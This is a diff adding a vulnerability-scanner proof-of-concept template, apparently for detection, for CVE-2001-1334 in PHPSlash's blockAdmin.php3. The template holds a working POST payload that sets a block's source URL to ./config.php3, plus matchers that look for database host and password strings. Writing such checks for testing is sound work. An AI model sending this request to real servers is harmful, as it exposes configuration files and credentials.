@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "PHPSlash 0.5.3/0.6.1 的 blockAdmin.php3 中 URL Block 功能未正确过滤 Source URL 参数，具有管理员权限的攻击者可创建 URL 类型 block 并将 Source URL 设为本地文件路径（如 ./config.php3），导致任意文件内容在页面中显示，造成敏感信息泄露。"
+id = "POC-AVE-2001-0529"
+name = "PHPSlash 0.5.3/0.6.1 URL Block Arbitrary File Disclosure PoC"
+severity = "medium"
+tags = [
+    "cve-2001-1334",
+    "phpslash",
+    "lfi",
+    "file-disclosure",
+]
+vuln_id = [
+    "CVE-2001-1334",
+    "AVE-2001-0529",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/blockAdmin.php3"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=create&block_type=url&title=test&source_url=./config.php3&section=home"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<?",
+    "DB_HOST",
+    "db_host",
+    "password",
+    "config",
+]
